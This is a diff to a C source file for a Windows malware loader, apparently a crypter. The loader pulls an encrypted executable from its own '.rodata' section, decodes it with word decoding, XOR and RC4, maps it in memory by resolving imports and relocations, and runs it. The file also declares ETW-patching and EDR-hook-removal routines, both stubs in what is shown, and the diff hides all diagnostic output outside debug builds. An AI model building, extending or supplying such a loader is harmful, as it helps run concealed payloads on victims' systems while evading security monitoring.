@@ -3,6 +3,12 @@
 #include <stdint.h>
 #include <windows.h>
 
+#ifdef DEBUG
+#define DEBUG_PRINT(...) printf(__VA_ARGS__)
+#else
+#define DEBUG_PRINT(...) (void)0
+#endif
+
 #define KEY_LENGTH 16 // 128 bits
 #define PRIME_LENGTH 8 // 64 bits
 #define PRIME_TOP 60124
@@ -13,6 +19,7 @@ void* load_pe (char* PE_data);
 void obfuscate_import_table(void);
 void patch_etw(void);
 void remove_edr_hooks(void);
+int decrypt_pe(unsigned char *pe_buf, unsigned char *decode_buf, size_t encrypted_size, size_t original_size, unsigned char *key);
 
 typedef BOOL (WINAPI * pVirtualProtect)(LPVOID lpAddress, SIZE_T dwSize, DWORD  flNewProtect, PDWORD lpflOldProtect);
 typedef HMODULE (WINAPI * pLoadLibraryA)(LPCTSTR lpFileName);
@@ -77,8 +84,8 @@ int main(int argc, char** argv) {
 
     size_t encrypted_size = *(int64_t*)(size_buffer);
     char *key_hexstring = (size_buffer+8);
-    printf("[info] Encrypted size: %i\n", encrypted_size);
-    printf("[info] Obfuscated Decode key: %.32s\n", key_hexstring);
+    DEBUG_PRINT("[info] Encrypted size: %i\n", encrypted_size);
+    DEBUG_PRINT("[info] Obfuscated Decode key: %.32s\n", key_hexstring);
 
     char* loader_handle = (char*)GetModuleHandleA(NULL);
 
@@ -87,19 +94,19 @@ int main(int argc, char** argv) {
     IMAGE_SECTION_HEADER* sections = (IMAGE_SECTION_HEADER*) (p_NT_HDR + 1);
 
     char* payload_PE = NULL;
-    char payload_PE_section_name[] = ".idata";
+    char payload_PE_section_name[] = ".rodata";
 
     for(int i = 0; i < p_NT_HDR->FileHeader.NumberOfSections; ++i) {
         if (!strcmp(sections[i].Name, payload_PE_section_name)) {
-            printf("[info] Found .idata section\n");
+            DEBUG_PRINT("[info] Found .rodata section\n");
             payload_PE = loader_handle + sections[i].VirtualAddress;
-            printf("[info] Payload PE at VA: 0x%.8x\n", *payload_PE);
+            DEBUG_PRINT("[info] Payload PE at VA: 0x%.8x\n", *payload_PE);
             break;
         }
     }
 
     if(payload_PE == NULL) {
-        printf("[error] Couldn't find payload PE\n");
+        DEBUG_PRINT("[error] Couldn't find payload PE\n");
         return 1;   
     }
 
@@ -114,17 +121,17 @@ int main(int argc, char** argv) {
         pos += 2;
     }
 
-    printf("[info] Decrypt PE\n");
+    DEBUG_PRINT("[info] Decrypt PE\n");
     memcpy(pe_buf, payload_PE, encrypted_size);
     size_t original_size = encrypted_size/INFLATION_FACTOR;
     char *decoded_buf = malloc(original_size);
     memset(decoded_buf, 0, original_size);
     decrypt_pe(pe_buf, decoded_buf, encrypted_size, original_size, key);
 
-    printf("[info] Load PE\n");
+    DEBUG_PRINT("[info] Load PE\n");
     void* start_address = load_pe(decoded_buf);
 
-    printf("[info] Calling PE\n");
+    DEBUG_PRINT("[info] Calling PE\n");
     if(start_address) {
         ((void (*)(void)) start_address)();
     }
@@ -147,7 +154,7 @@ void* load_pe(char* PE_data) {
     DWORD size_of_headers = p_NT_HDR->OptionalHeader.SizeOfHeaders;
     WORD num_of_sections = p_NT_HDR->FileHeader.NumberOfSections;
 
-     printf("[info] hdr_image_base:%i\n\
+     DEBUG_PRINT("[info] hdr_image_base:%i\n\
             size_of_image:%i\n\
             entry_point_RVA:%i\n\
             size_of_headers:%i\n\
@@ -170,21 +177,20 @@ void* load_pe(char* PE_data) {
         }
     }
 
-    printf("[info] Handle Import Table\n");
-
+    DEBUG_PRINT("[info] Handle Import Table\n");
+    
     // IMPORT TABLE
     IMAGE_DATA_DIRECTORY* data_directory = p_NT_HDR->OptionalHeader.DataDirectory;
-
     IMAGE_IMPORT_DESCRIPTOR* import_descriptors = (IMAGE_IMPORT_DESCRIPTOR*)(image_base + data_directory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);
 
     for (int i = 0; import_descriptors[i].OriginalFirstThunk != 0; ++i) {
-
+        
         char* module_name = image_base + import_descriptors[i].Name;
         HMODULE import_module = fnLoadLibraryA(module_name);
-        printf("[info] Module Name: %s\n", module_name);
-        
+
+        DEBUG_PRINT("[info] Module Name: %s\n", module_name);
         if (import_module == NULL) {
-            printf("[error] Import Module could not be found %s, continue...\n", module_name);
+            DEBUG_PRINT("[error] Import Module could not be found %s, continue...\n", module_name);
             continue;
         }
 
@@ -194,7 +200,6 @@ void* load_pe(char* PE_data) {
 
         for (int i = 0; lookup_table[i].u1.AddressOfData != 0; ++i) {
             void *function_handle = NULL;
-
             DWORD lookup_addr = lookup_table[i].u1.AddressOfData;
 
             if ((lookup_addr & IMAGE_ORDINAL_FLAG) == 0) { // if first bit is not 1
@@ -204,12 +209,12 @@ void* load_pe(char* PE_data) {
             } else {
                 // import by ordinal, directly
                 DWORD ordinal_num = lookup_addr & (~IMAGE_ORDINAL_FLAG);
-                printf("[info] Import by ordinal %u directly\n", ordinal_num);
+                DEBUG_PRINT("[info] Import by ordinal %u directly\n", ordinal_num);
                 function_handle = (void *)GetProcAddress(import_module, MAKEINTRESOURCEA(lookup_addr));
             }
 
             if (function_handle == NULL) {
-                printf("[error] Function could not be found in module %s\n", module_name);
+                DEBUG_PRINT("[error] Function could not be found in module %s\n", module_name);
                 continue;
             }
 
@@ -217,7 +222,7 @@ void* load_pe(char* PE_data) {
         }
     }
 
-    printf("[info] Handle Relocations\n");
+    DEBUG_PRINT("[info] Handle Relocations\n");
 
     // RELOCATIONS
     DWORD delta_VA_reloc = ((DWORD)image_base) - p_NT_HDR->OptionalHeader.ImageBase;
@@ -291,10 +296,12 @@ void patch_etw(void) {
 	
     // fnVirtualProtect(pEventWrite, size, oldprotect, &oldprotect);
 	// FlushInstructionCache(hCurrentProc, pEventWrite, size);
+    return;
 }
 
  void remove_edr_hooks(void) {
     // TODO
+    return;
 }
 
 
@@ -306,7 +313,7 @@ char decode_word(char* word) {
             return (char)i;
         }
     }
-    printf("[error] Decoding failed for: %s\n", word);
+    DEBUG_PRINT("[error] Decoding failed for: %s\n", word);
 
     return '\0';
 }
@@ -353,10 +360,10 @@ void rc4_crypt(unsigned char *s, unsigned char *data, int data_len) {
 
 int decrypt_pe(unsigned char *pe_buf, unsigned char *decode_buf, size_t encrypted_size, size_t original_size, unsigned char *key) {
 
-    printf("[info] Start prime calculation\n");
+    DEBUG_PRINT("[info] Start prime calculation\n");
     uint64_t last_prime = calc_prime_number(PRIME_TOP);
     uint8_t* prime_ptr = (uint8_t *)(&last_prime);
-    printf("[info] Last prime number: %llu\n", last_prime);
+    DEBUG_PRINT("[info] Last prime number: %llu\n", last_prime);
    
     // word decode
     char *decode_pos = decode_buf;
@@ -375,7 +382,7 @@ int decrypt_pe(unsigned char *pe_buf, unsigned char *decode_buf, size_t encrypte
     for (int i = 0; i < KEY_LENGTH; i++) {
         sprintf(&hex_string[i * 2], "%02x", key[i]);
     }
-    printf("[info] Deobfuscated Key: %s\n", hex_string);
+    DEBUG_PRINT("[info] Deobfuscated Key: %s\n", hex_string);
 
     // XOR decode
     for (size_t i = 0; i < original_size; i++) {
@@ -386,7 +393,7 @@ int decrypt_pe(unsigned char *pe_buf, unsigned char *decode_buf, size_t encrypte
     rc4_init(s, key);
     rc4_crypt(s, decode_buf, original_size);
 
-    printf("[info] Decoded Last Byte: %.2x Decoded First Byte: %.2x\n", decode_buf[0], decode_buf[original_size-1]);
+    DEBUG_PRINT("[info] Decoded Last Byte: %.2x Decoded First Byte: %.2x\n", decode_buf[0], decode_buf[original_size-1]);
     
     return 0;
 }
